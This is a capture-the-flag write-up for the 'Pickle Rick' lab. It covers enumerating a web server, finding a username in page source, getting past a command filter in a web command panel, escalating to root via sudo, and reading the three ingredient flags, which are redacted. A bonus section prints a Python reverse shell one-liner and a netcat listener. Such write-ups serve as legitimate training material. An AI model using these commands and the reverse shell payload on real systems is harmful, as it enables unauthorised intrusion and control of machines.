# Pickle Rick

[TOC]

## Introduction

A Rick and Morty CTF. Help turn Rick back into a human!

## Basic Information

Target IP: 10.10.85.248

## Enumeration

Let us start by performing an nmap scan on the target machine in order to know what services it is hosting.

```bash
nmap -A -T4 10.10.85.248 -oN picklerick
```

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-16 10:41 EST
> Nmap scan report for 10.10.85.248
> Host is up (0.045s latency).
> Not shown: 998 closed tcp ports (conn-refused)
> PORT   STATE SERVICE VERSION
> 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
> | ssh-hostkey: 
> |   2048 31a8badeb4470006658645d9f1f974b0 (RSA)
> |   256 b017e492602e909b0ea85567b43c10f2 (ECDSA)
> |_  256 57dd42f9d86b1fc75da45e7b952e4c9c (ED25519)
> 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
> |_http-title: Rick is sup4r cool
> |_http-server-header: Apache/2.4.18 (Ubuntu)
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
>
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds

The target is hosting two different services: SSH and an Apache/2.4.18 WebServer.

It is also possible to infer that the target machine is running Ubuntu.



## Port 80

Visiting the website being hosted on port 80, we can see that Rick has turned himself into a pickle again and needs three secret ingredients to revert back, which are stored on his computer. The problem is Rick has forgotten his password and needs our help.

At first glance we cannot find any link that would forward us to a **login page**. Not only that but we are also lacking his a **username** and a **password**.

Let us try to inspect the landing page's source code to find paths and possible comments with interesting information.

1. After inspecting the HTML code we can see a /assets path

> ```HTML
> <script src="assets/jquery.min.js"></script>
> <script src="assets/bootstrap.min.js"></script>
> ```

2. And a comment which unveils a username

> ```html
>  <!--
> 
>     Note to self, remember username!
> 
>     Username: R1ckRul3s
> 
>   -->
> ```

**Username** found, **password** and **login** **page** to go.

Further inspection to the HTML does not really provide us with any additional information regarding a hidden link to the login page, for example. Hence, let us perform some web enumeration with **Gobuster** in order to see if we can find new information.

Note: You are free to explore the assets directory, but in our case it does not really contain any useful information for us to leverage.

![image-20230116105531902](/home/kali/.config/Typora/typora-user-images/image-20230116105531902.png)

### GoBuster Web Enumeration

We would like to run a quick scan that would search for further directories as well as some specific file extensions such as php, since we are dealing with an Apache Server (PHP is the programming language that works with apache to help create dynamic web content). 

Running the following command generated the output below:

```bash
gobuster dir -u http://10.10.85.248 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,css,js,txt
```

> ===============================================================
> Gobuster v3.4
>
> [+] Url:                     http://10.10.85.248
> [+] Method:                  GET
> [+] Threads:                 10
> [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
> [+] Negative Status codes:   404
> [+] User Agent:              gobuster/3.4
> [+] Extensions:              txt,php,html,css,js
>
> /index.html           (Status: 200) [Size: 1062]
> /.html                (Status: 403) [Size: 292]
> /.php                 (Status: 403) [Size: 291]
> /login.php            (Status: 200) [Size: 882]
> /assets               (Status: 301) [Size: 313] [--> http://10.10.85.248/assets/]
> /portal.php           (Status: 302) [Size: 0] [--> /login.php]
> /robots.txt           (Status: 200) [Size: 17]

There are two interesting findings that were outputed by Gobuster:

1. robots.txt: Commonly this file is placed in websites so that webcrawlers know which URLs they can access on your site. It can potentially unveil interesting web resources or hidden pages so it should be something to check every time.

   In the case of this lab, the content of the robots.txt file is `<Redacted>`. What could this mean?

2. login.php: Finally, we have the login page, which asks the user for a username and password. The username should be `R1ckRul3s`. What other piece of information do we have? Let us try the password `<Redacted>`.

Note: The portal.php simply redirects the user to the portal.php resource.

![image-20230116112406137](/home/kali/.config/Typora/typora-user-images/image-20230116112406137.png)

Great! We are in!

### Command Panel

After inspecting the website we can see that the only useful and actionable tab is the Commands tab.

This looks like a Command Panel so let us try to run some Linux commands:

```
whoami
```

> uid=33(www-data) gid=33(www-data) groups=33(www-data)



```
id
```

> www-data



```
pwd
```

> /var/www/html



### First Ingredient

Now that we know we can run commands as www-data, let us see where we are in the file system and what files are in the current directory.

```
pwd; ls -la
```

> /var/www/html
>
> total 40
> drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
> drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
> -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
> drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
> -rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
> -rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
> -rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
> -rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
> -rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
> -rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt



Great, our first ingredient! We can read the content of the file using the cat command.

```
cat Sup3rS3cretPickl3Ingred.txt
```

![image-20230116113052630](/home/kali/.config/Typora/typora-user-images/image-20230116113052630.png)

But wait, it seems the server has some kind of filtering for the commands that can be used.

Luckily we have some alternatives such as:

1. `tac <filename>` Works!
2. `head <filename>` Does not work :(
3. `tail <filename>` Does not work :(
4. `nl <filename>` Works!
5. `less <filename>` Works!
6. `more <filename>` Does not work :(
7. `grep . <filename>` Works!
8. `while read line; echo $line; done <filename>` Works!

The first ingredient is:

> <Redacted>

Note: If you inspect the `portal.php` file it becomes visible how the filtering of the web application was being performed. Blocking some of the commands mentioned above.

![image-20230116115323288](/home/kali/.config/Typora/typora-user-images/image-20230116115323288.png)



### 2nd Ingredient

If we take a closer inspection at the remaining files, one is of particular interest `clue.txt`.

> Look around the file system for the other ingredient.

We could try to use find to search for the file but we do not know how it is called. Therefore, let us explore the file system manually.

Since changing directories is not persistent across different commands executions, we will have to use the `ls` command on the way.

From experience I went straight to the home directory to see what we could find.

```
ls -la ../../../home
```

> total 16
> drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
> drwxr-xr-x 23 root   root   4096 Jan 16 15:27 ..
> drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
> drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu



```
ls -la ../../../home/rick/second ingredients
```

> ```
> total 12
> drwxrwxrwx 2 root root 4096 Feb 10  2019 .
> drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
> -rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
> ```

We found the second ingredient!



```
nl "../../../home/rick/second ingredients"
nl '../../../home/rick/second ingredients'
```

> <Redacted>



**Note:** Do not forget to place quotation or apostrophes surrounding the file path, because of the space between second and ingredients. Without them the command would be interpreted as `nl ../../../home/rick/second` and ingredients as an argument which would output nothing to the user. 

### 3rd Ingredient

Finally, for the third ingredient the first place I searched for was in `/root`. Unfortunately we cannot access that folder since we are not `root`, but www-data.

A typical Privilege Escalation technique is to check what kind of commands can our user run as sudo. We can do that with the command:

```
sudo -l
```

> Matching Defaults entries for www-data on ip-10-10-85-248.eu-west-1.compute.internal:
>     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
>
> User www-data may run the following commands on ip-10-10-85-248.eu-west-1.compute.internal:
>     (ALL) NOPASSWD: ALL

Lucky us! There are no command restrictions for us to run sudo so we can easily check what is inside the root folder.



```
sudo ls -al ../../../root
```

> total 28
> drwx------  4 root root 4096 Feb 10  2019 .
> drwxr-xr-x 23 root root 4096 Jan 16 15:27 ..
> -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
> -rw-r--r--  1 root root  148 Aug 17  2015 .profile
> drwx------  2 root root 4096 Feb 10  2019 .ssh
> -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
> drwxr-xr-x  3 root root 4096 Feb 10  2019 snap



There it is!

```
sudo nl ../../../root/3rd.txt
```

> <Redacted>



Good job! You were able to turn Rick back to normal!



## Bonus: Reverse Shell

There was an alternative path we could have taken which would be to use the command panel to get a reverse shell.

We already know the server is running PHP, but let us check if it can run python or netcat.

```
man <software>
man php
man python3
man nc

nc -h 2>&1
python3 -h

python3 --version
php --version
```

All of the above commands returns valid outputs showcasing that the server is running all of the components above.

Hence, we just have to launch a local listener and connect back using a reverse shell payload.

### Python 3

Listener (Our Machine)

```
nc -lnvp <PORT>
```

Payload (Target Machine)

```
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Note: I also tried a Bind Shell but it is refused by the target.

![image-20230116125221323](/home/kali/.config/Typora/typora-user-images/image-20230116125221323.png)
